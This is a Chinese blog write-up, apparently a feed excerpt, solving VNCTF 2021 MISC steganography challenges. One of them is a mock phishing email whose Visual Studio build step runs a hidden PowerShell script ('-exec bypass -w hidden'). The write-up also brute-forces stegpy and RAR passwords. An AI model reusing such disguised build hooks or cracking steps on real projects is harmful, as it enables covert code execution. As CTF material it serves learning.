pty.spawn(sys.argv[1:])&#39;, *cmd],stdin&#x3D;PIPE,stdout&#x3D;PIPE,stderr&#x3D;PIPE)</span><br><span class="line">        print(subp.stdout.read(len(&quot;Enter password (will not be echoed):&quot;)))</span><br><span class="line">        subp.stdin.write(bytes((password+&#39;\n&#39;).encode(&#39;utf-8&#39;)))</span><br><span class="line">        subp.stdin.flush()</span><br><span class="line">        print(subp.stdout.readlines())</span><br><span class="line">        # print(subp.stdout.readlines()[1])</span><br><span class="line">        print(&#39;\n&#39;)</span><br><span class="line">    elif choice &#x3D;&#x3D; &#39;3&#39;:</span><br><span class="line">        file &#x3D; open(&#39;password.txt&#39;, &#39;r&#39;)</span><br><span class="line">        line &#x3D; file.readline()</span><br><span class="line">        while line:</span><br><span class="line">            print(line)</span><br><span class="line">            cmd &#x3D; [&quot;stegpy&quot;, &quot;-p&quot;, pic]</span><br><span class="line">            subp &#x3D; Popen([sys.executable, &#39;-c&#39;, &#39;import pty, sys; pty.spawn(sys.argv[1:])&#39;, *cmd], stdin&#x3D;PIPE, stdout&#x3D;PIPE,stderr&#x3D;PIPE)</span><br><span class="line">            print(subp.stdout.read(len(&quot;Enter password (will not be echoed):&quot;)))</span><br><span class="line">            subp.stdin.write(bytes((line + &#39;\n&#39;).encode(&#39;utf-8&#39;)))</span><br><span class="line">            subp.stdin.flush()</span><br><span class="line">            print(&#39;result:&#39;)</span><br><span class="line">            print(subp.stdout.readlines()[1])</span><br><span class="line">            # print(subp.stdout.readlines()[1])</span><br><span class="line">            print(&#39;\n&#39;)</span><br><span class="line">            line &#x3D; file.readline()</span><br><span class="line">    else :</span><br><span class="line">        print(&#39;Input Wrong!&#39;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    checkwebp(&#39;happynewyear.png&#39;)</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="HAPPY4.jpg" alt="HAPPY4"></p><p>得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VNCTF&#123;HappyNewY3a5&#125;</span><br></pre></td></tr></table></figure><h3><span id="3">3</span></h3><h4><span id="vnctf-2021interesting_fishing">[VNCTF 2021]interesting_fishing</span></h4><blockquote><p>crazyman_army是某安全公司的研究人员</p><p>这天他的其邮箱里发现了一封奇怪的邮件</p><p>你能帮助他找到其隐藏的信息吗</p><p>附件是第一部分的flag</p><p>图片是第二部分的flag</p><p>最后flag为 第一部分+第二部分(vnctf{*})</p></blockquote><p>注释.txt:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crazyman_army是某安全公司的研究人员</span><br><span class="line">这天他的其邮箱里发现了一封奇怪的邮件 </span><br><span class="line">你能帮助他找到其隐藏的信息吗</span><br><span class="line"></span><br><span class="line">注意:</span><br><span class="line">附件是第一部分的flag</span><br><span class="line">图片是第二部分的flag</span><br><span class="line">最后flag为 第一部分+第二部分</span><br><span class="line"></span><br><span class="line">hint:powershell解码后的字符可能存在不可读的情况 那并不是解码错误</span><br></pre></td></tr></table></figure><p>研究项目的讨论.bin</p><p><img lazyload src="/images/loading.svg" data-src="interesting1.jpg" alt="interesting1"></p><p>更改后缀为.eml，能看到是一封邮件。</p><p>用<a class="link" href="https://www.foxmail.com/">foxmail<i class="fas fa-external-link-alt"></i></a>打开</p><p>就可以把图片和附件另存为到本机了。</p><p>先处理附件：</p><p>发现giveyourflag.sln，用vs打开</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; &quot;Hi boy\n&quot;;</span><br><span class="line">    std::cout &lt;&lt; &quot;This is your flag:flag&#123;Th1s_iS_f@kE_fL4G&#125;\n&quot;;</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Visual Studio2017&gt;生成&gt;生成giveyourflag</p><p>若出现【无法找到v142的生成工具(平台工具集=“v142”)。】，Visual Studio2017&gt;项目&gt;giveyourflag属性&gt;配置属性&gt;常规&gt;平台工具集&gt;【v142(未安装)】更改为【Visual Studio 2017 (v141)】</p><p>重新生成后的得到报错【命令&quot;powershell -exec bypass -w hi&quot;dd&quot;en -f x64\Debug\Browse.VC.db】</p><p>缺少上述文件，但在压缩包里找不到。</p><p>可能是文件隐藏。</p><p>系统搜索【文件资源管理器选项】&gt;查看&gt;取消勾选”隐藏受保护的操作系统文件(推荐)“</p><p>看到该文件。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$encodestring &#x3D; &quot;XAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQANwA4AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAMQA4AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAAzAD8AXAB1AC0ANgA1ADQAOAAxAD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAOAAyAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAwAD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgAzAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA5AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQANQA2AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA3AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANQA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgAxAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgA5AD8AXAB1AC0ANgA1ADQANQA3AD8AXAB1AC0ANgA1ADQANQAwAD8AXAB1AC0ANgA1ADQANgAzAD8AXAB1AC0ANgA1ADQANgA4AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQANwA5AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8A&quot;</span><br><span class="line">$bytes  &#x3D; [System.Convert]::FromBase64String($string);</span><br><span class="line">$decoded &#x3D; [System.Text.Encoding]::UTF8.GetString($bytes); </span><br><span class="line">echo $decoded</span><br></pre></td></tr></table></figure><p>根据代码，cyberchef经过from base64操作后得到</p><p>RTF格式下的unicode编码</p><p>附上官方脚本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#x3D;r&quot;\u-65432?\u-65420?\u-65420?\u-65424?\u-65421?\u-65478?\u-65489?\u-65489?\u-65418?\u-65426?\u-65437?\u-65420?\u-65434?\u-65491?\u-65486?\u-65487?\u-65485?\u-65491?\u-65487?\u-65486?\u-65483?\u-65481?\u-65488?\u-65482?\u-65487?\u-65487?\u-65486?\u-65485?\u-65490?\u-65437?\u-65425?\u-65421?\u-65490?\u-65439?\u-65424?\u-65491?\u-65426?\u-65439?\u-65426?\u-65430?\u-65431?\u-65426?\u-65433?\u-65490?\u-65427?\u-65415?\u-65423?\u-65437?\u-65428?\u-65425?\u-65419?\u-65436?\u-65490?\u-65437?\u-65425?\u-65427?\u-65489?\u-65456?\u-65415?\u-65425?\u-65426?\u-65433?\u-65415?\u-65439?\u-65426?\u-65433?\u-65499?\u-65486?\u-65488?\u-65421?\u-65420?\u-65425?\u-65422?\u-65435?\u-65421?\u-65499?\u-65486?\u-65488?\u-65428?\u-65425?\u-65417?\u-65499?\u-65486?\u-65488?\u-65425?\u-65426?\u-65499?\u-65486?\u-65488?\u-65434?\u-65425?\u-65422?\u-65435?\u-65431?\u-65433?\u-65426?\u-65499?\u-65486?\u-65488?\u-65433?\u-65425?\u-65425?\u-65436?\u-65421?\u-65499?\u-65486?\u-65488?\u-65439?\u-65427?\u-65431?\u-65436?\u-65499?\u-65486?\u-65488?\u-65458?\u-65425?\u-65422?\u-65420?\u-65432?\u-65499?\u-65486?\u-65488?\u-65461?\u-65425?\u-65422?\u-65435?\u-65439?\u-65426?\u-65499?\u-65486?\u-65488?\u-65469?\u-65457?\u-65450?\u-65463?\u-65468?\u-65491?\u-65487?\u-65479?\u-65499?\u-65486?\u-65488?\u-65424?\u-65439?\u-65422?\u-65439?\u-65426?\u-65425?\u-65431?\u-65439?\u-65490?\u-65422?\u-65439?\u-65422?&quot;</span><br><span class="line">l&#x3D;list(s[3:-1].split(r&quot;?\u-&quot;))</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in l:</span><br><span class="line">    flag+&#x3D;chr(65536-int(i))</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行后得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vnctf-213-1257061123.cos.ap-nanjing.myqcloud.com&#x2F;Pyongyang%20stores%20low%20on%20foreign%20goods%20amid%20North%20Korean%20COVID-19%20paranoia.rar</span><br></pre></td></tr></table></figure><p>一个加密的压缩包，提示密码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">maskcode</span><br><span class="line">The password is: four digits</span><br></pre></td></tr></table></figure><p>ARCHPR爆破无果。</p><p>得到一个工具Accent RAR Password Recovery，发现【编码与密码】的压缩包里有，只不过存在版本问题，附上下载链接：<a class="link" href="https://gd.jisuxz.com/down_new/accent_rar_password_recovery.rar">https://gd.jisuxz.com/down_new/accent_rar_password_recovery.rar<i class="fas fa-external-link-alt"></i></a></p><p>但因为是英文版，就添加了【编码与密码】里的chinese.lng，再运行.reg文件</p><p>同时根据https://www.muruoxi.com/pc/2253.html修复报错</p><p><img lazyload src="/images/loading.svg" data-src="interesting2.jpg" alt="interesting2"></p><p>利用密码【9705】打开压缩包，得到Pyongyang stores low on foreign goods amid North Korean COVID-19 paranoia.docx</p><p>更改后缀名.zip</p><p>解压后打开word&gt;hideinfo.xml</p><p><img lazyload src="/images/loading.svg" data-src="interesting3.jpg" alt="interesting3"></p><p>宽字符隐写得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vnctf&#123;APT_1S_c0M1nG</span><br></pre></td></tr></table></figure><p>第二部分图片：</p><p>另存为ThisIsSecret.jpg</p><p>用工具OurSecret</p><p>解密下半部分</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_fr0m_l@z@RuS&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vnctf&#123;APT_1S_c0M1nG_fr0m_l@z@RuS&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;1&quot;&gt;1&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;vnctf-2021冰冰好像藏着秘密&quot;&gt;[VNCTF 2021]冰冰好像藏着秘密&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;发现冰冰藏着的flag，flag格式为VNCTF{*</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
</feed>
